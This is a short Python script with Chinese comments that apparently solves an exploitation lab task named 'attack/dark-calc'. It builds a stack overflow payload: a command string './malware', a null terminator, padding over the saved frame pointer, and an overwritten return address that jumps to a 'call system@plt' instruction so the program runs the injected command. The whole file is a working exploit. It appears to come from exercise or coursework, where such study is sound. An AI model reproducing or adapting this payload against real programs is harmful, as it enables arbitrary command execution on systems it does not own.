#!/usr/bin/env python3
"""Task 1 (更纯粹版): build the payload for attack/dark-calc.

不依赖 shell 命令注入，而是直接把返回地址劫持到 eval() 内部
"mov edi, command_buf; call system@plt" 之前，跳过 echo $(( )) 的拼接逻辑，
让 system() 直接执行缓冲区里的原始命令。
"""
import sys
import struct

payload = (
    b"./malware"                      # 9 字节：command_buf 最终收到的原始命令
    + b"\x00"                         # 1 字节：null 终止符，strcpy 在此停下
    + b"A" * 14                        # 14 字节：填充到偏移 24（覆盖 saved rbp，内容无所谓）
    + struct.pack("<Q", 0x401a6b)      # 覆盖返回地址：跳到 eval() 里 call system@plt 前一条指令
)

sys.stdout.buffer.write(payload)
